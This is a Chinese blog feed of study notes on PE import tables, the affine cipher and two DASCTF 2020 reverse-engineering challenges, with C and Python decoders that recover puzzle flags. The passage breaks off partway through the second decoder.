<strong>1c87h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519150821954-1590826622691.png" alt="image-20200519150821954"></p><p>  2.RVA: <strong>10D000h</strong> -&gt; RAW:  <strong>(10D000-10D000+CC400) = CC400h</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519151445783-1590826622692.png" alt="image-20200519151445783"></p><p>  3.找到输入表. 记录下对应成员的RVA.</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153011688-1590826622692.png" alt="image-20200519153011688"></p><p>  4.查看该输入表名称: <strong>ADVAPI32,DLL</strong>, RVA: <strong>10D9C8</strong> -&gt; RAW: <strong>(10D9C8-10D000+CC400) = CCDC8</strong> </p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519153843705-1590826622692.png" alt="image-20200519153843705"></p><p>  5.查看 <strong>OriginalFirstThunk( INT )</strong>  RVA:<strong>10D0C8</strong> -&gt; RAW: <strong>(10D0C8-10D000+CC400) = CC4C8</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519155230578-1590826622692.png" alt="image-20200519155230578"></p><p>  6.可以看到第一成员的最高位是 0, 则该值是IMAGE_IMPORT_BY_NAME的RVA.(RVA: <strong>10DA33</strong> -&gt; RAW: <strong>CCE33</strong>)</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519160556676-1590826622692.png" alt="image-20200519160556676"></p><p>  7.查看 FirstThunk( IAT ) RVA: <strong>10D0E4</strong> -&gt; RAW: <strong>(10D0E4-10D000+CC400) = CC4E4</strong></p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519163851829-1590826622692.png" alt="image-20200519163851829"></p><p>  8.从步骤7可以看到, PE装载器装载PE文件之前, INT与IAT各元素同时指向相同的地址.</p><p>  9.再看 TimeDateStamp 成员的值为 0, 那就是输入表被绑定, 如果与该对应 .dll PE文件的文件头的 TimeDateStamp的值相同,  那这个输入表是不需要修正的.</p><p>  10.从上面知道 IAT 的RVA: <strong>10D0E4</strong>.  库名称: <strong>ADVAPI32,DLL</strong>另外使用一个OD载入这个OD程序看看. 可以看到加载该.dll文件文件的RVA是从 <strong>FC0000</strong>开始的,  而查看未被PE装载器装载前的状态, IAT的RVA是 <strong>10D0E4</strong>,所以显然这是需要PE装载器装载时对输入表修正的, 那也可推出他们的 TimeDateStamp 的值是不同的</p><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200519164915615-1590826622692.png" alt="image-20200519164915615"></p><blockquote><p>输入表与输出表联系还是比较大, 结合起来看看清楚很多.</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto</title>
      <link href="/2020/05/29/Crypto/"/>
      <url>/2020/05/29/Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><blockquote><p>仿射密码是是加法密码与乘法密码的结合。它一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。加密后字母的大小写不变的。</p></blockquote><ul><li>加密函数：<strong>E(x) = (ax + b) (mod m)</strong>，其中a与m互为质数，这也是能求a逆模的必要条件。</li><li>解密函数：<strong>D(x) = a^-1(x - b)(mod m)</strong>，其中 a^-1为a在Zm群的逆元。</li></ul><blockquote><p>当 a = 1时相当于凯撒密码， 其实整个密码就是凯撒密码那种意思，只是加强版吧。</p><p>对于求逆元可以直接使用python gmpy2库的 invert() 方法。<a id="more"></a></p></blockquote><p>以GKCTF2020中第一道 Crypto 作为练手。</p><p><img src="/2020/05/29/Crypto/image-20200529175847900.png" alt="image-20200529175847900"></p><ul><li><p>首先知道 a = 11，b = 6，m = 26。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"welcylk"</span>:</span><br><span class="line">    flag += chr(((ord(i)<span class="number">-97</span>)<span class="number">-6</span>)*gmpy2.invert(<span class="number">11</span>, <span class="number">26</span>)%<span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">flag = bytes(flag, encoding = <span class="string">"utf-8"</span>) <span class="comment">#将str转化为byte类型。</span></span><br><span class="line">flag = base64.b64encode(flag)<span class="comment">#这里只能使用byte类型。</span></span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><blockquote><p>python中str与byte区别：</p><p>Python3严格区分文本（str）和二进制数据（Bytes），文本总是Unicode，用str类型，二进制数据则用Bytes类型表示。</p><p>str -&gt; byte：</p><p>s = bytes(s, encoding = “utf-8”)</p><p>s = s.encode()</p><p>s = s.encode(encoding = “utf-8”)</p><p>byte -&gt; str：</p><p>s = str(s, encoding = “utf-8”)</p><p>s = bytes.decode(s)</p><p>s = s.decode()</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年DASCTF五月线上赛</title>
      <link href="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>五月赛，从学习信安以来第二次参加的比赛，慢慢来。<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ViQinere"><a href="#ViQinere" class="headerlink" title="ViQinere"></a>ViQinere</h3><p>64位elf文件，载入ida后发现与以往的不同。很多函数都没显示出来。</p><p>linux中运行一下，显示对flag加密，然后是一些乱码。后来群里通知, 这个有靶机。</p><p>nc连接一下，那题目的flag存放在服务器，文件操作取出flag，经过加密。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png" alt="image-20200523203121150"></p><p>接着再在ida中看一下，有几个字符很懵，后面才发现就是改变输出字符串样式，这也是为什么linux中运行的时候会有涂鸦与闪动。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204020172.png" alt="image-20200523204020172"></p><p>然后是被涂鸦的那一段坑了，显示 <strong>Flag was encrypted by <a href="http://cc.TaQini.space" target="_blank" rel="noopener">http://cc.TaQini.space</a></strong> ，一直以为加密和这个有关,  嗯…后来发现是题目作者给自己打的广告。</p><p>虽然很多函数不能显示出来，但也是能猜出来作用。看看汇编会更清楚。</p><p>最后找到加密函数 <strong>sub_1249((__int64)byte_4080);</strong> 这下就好办了。进去函数可以知道，大写字母加密为大写字母，小写字母加密为小写字母，其他字符不变。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523204833774.png" alt="image-20200523204833774"></p><p>对于逆这个算法，没有过多的想，算是直接穷尽的吧。因为大写字母变大写字母，小写字母变小写字母。</p><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1209</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a &gt;= <span class="number">97</span> &amp;&amp; a &lt;= <span class="number">122</span>)</span><br><span class="line"><span class="keyword">return</span> a<span class="number">-97</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">65</span> &amp;&amp; a &lt;= <span class="number">90</span>)</span><br><span class="line"><span class="keyword">return</span> (a<span class="number">-65</span>)^<span class="number">0xFFFFFF80</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> a; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v4 = <span class="number">0</span>, j = <span class="number">0</span>, v2 = <span class="number">0</span>, v5 = <span class="number">0</span>, v1 = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"TaQini"</span>;</span><br><span class="line"><span class="keyword">char</span> c[] = <span class="string">"FQD&#123;GfjuJ5UbLrWjZjpvErXkiAZzlvO0xTa!cwnLLAsy3B0iEvEy&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = <span class="number">122</span>-i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((c[i] &gt;= <span class="number">97</span> &amp;&amp; c[i] &lt;= <span class="number">122</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v2 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[((v2&amp;<span class="number">0x7F</span>) + v4)%<span class="number">26</span>])</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">90</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v4 = sub_1209(j);</span><br><span class="line">v1 = sub_1209(b[v5 &amp; <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">if</span>(c[i] == a[(v4+(v1 &amp; <span class="number">0x7F</span>) + <span class="number">128</span>)%<span class="number">26</span>] - <span class="number">32</span>)</span><br><span class="line">&#123;</span><br><span class="line">c[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">v5++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后补充一下对改变输出字符串的知识。</p><table><thead><tr><th>\033[0m</th><th>关闭所有属性</th></tr></thead><tbody><tr><td><strong>\033[01m</strong></td><td><strong>设置高亮度</strong></td></tr><tr><td><strong>\033[04m</strong></td><td><strong>下划线</strong></td></tr><tr><td><strong>\033[05m</strong></td><td><strong>闪烁</strong></td></tr><tr><td><strong>\033[07m</strong></td><td><strong>反显</strong></td></tr><tr><td><strong>\033[08m</strong></td><td><strong>消隐</strong></td></tr><tr><td><strong>\033[30m – \033[37m</strong></td><td><strong>设置前景色</strong></td></tr><tr><td><strong>\033[40m – \033[47m</strong></td><td><strong>设置背景色</strong></td></tr><tr><td><strong>\033[nA</strong></td><td><strong>光标上移n行</strong></td></tr><tr><td><strong>\033[nB</strong></td><td><strong>光标下移n行</strong></td></tr><tr><td><strong>\033[nC</strong></td><td><strong>光标右移n行</strong></td></tr><tr><td><strong>\033[nD</strong></td><td><strong>光标左移n</strong></td></tr><tr><td><strong>\033[y;xH</strong></td><td><strong>设置光标位置</strong></td></tr><tr><td><strong>\033[2J</strong></td><td><strong>清屏</strong></td></tr><tr><td><strong>\033[K</strong></td><td><strong>清除从光标到行尾的内容</strong></td></tr><tr><td><strong>\033[s</strong></td><td><strong>保存光标位置</strong></td></tr><tr><td><strong>\033[u</strong></td><td><strong>恢复光标位置</strong></td></tr><tr><td><strong>\033[?25l</strong></td><td><strong>隐藏光标</strong></td></tr><tr><td><strong>\033[?25h</strong></td><td><strong>显示光标</strong></td></tr></tbody></table><p>总结: 题本来很简单，主要几次被带入坑。也是没经验。</p><h3 id="MiscVm"><a href="#MiscVm" class="headerlink" title="MiscVm"></a>MiscVm</h3><p>下载下来, 64位的无壳elf文件和一个操作码文件。操作码其实题中也有, 这里单独给了方便很多。</p><p>载入ida. C++逆向类的，但还好都是很基本的语法。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075414831.png" alt="image-20200524075414831"></p><p>分别进去三个加密函数，第一个: <strong>sub_19E2((int64)&amp;v13</strong>  (__int64)&amp;v14); 很简单，就是 2个数的值交换。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075631032.png" alt="image-20200524075631032"></p><p>第二个: <strong>sub_1551((int64)&amp;v14, (int64)&amp;v13);</strong> 就是按照给定顺序进行简单的值交换。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524075954652.png" alt="image-20200524075954652"></p><p>第三个: <strong>v8 = (unsigned int)sub_EEC(&amp;v14, &amp;v15, 0LL) != 0</strong>，这个相对于要麻烦一些, 但分析一下， 思路理清，逆回去就好了。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083055817.png" alt="image-20200524083055817"></p><p>exp: C语言写的，比较冗长。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode_4</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"></span><br><span class="line">j ^= <span class="number">10</span>;</span><br><span class="line">temp = (<span class="number">16</span>*j &gt;&gt; <span class="number">31</span>)&gt;&gt;<span class="number">28</span>;</span><br><span class="line"><span class="keyword">if</span>(a == j + (((temp + <span class="number">16</span>*(*(<span class="keyword">char</span> *)&amp;j))&amp;<span class="number">0xF</span>)-temp))</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">37</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">74</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">123</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">212</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">79</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">200</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">6</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">144</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">59</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">196</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">96</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">75</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">208</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">108</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">70</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">112</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">76</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">204</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">36</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> d[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, e[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a1[<span class="number">100</span>] = &#123;<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">36</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">31</span>,<span class="number">25</span>,<span class="number">14</span>,<span class="number">23</span>,<span class="number">33</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">24</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">36</span>,<span class="number">20</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">27</span>,<span class="number">30</span>,<span class="number">35</span>,<span class="number">37</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">100</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">31</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">35</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">16</span>,<span class="number">27</span>,<span class="number">18</span>,<span class="number">25</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">22</span>,<span class="number">28</span>,<span class="number">26</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">32</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">37</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">-87</span>)</span><br><span class="line"><span class="keyword">switch</span>(a1[<span class="number">87</span>+i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = (A.a[j] / <span class="number">16</span>)*<span class="number">2</span>;</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">A.a[j] /= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">A.a[j] -= <span 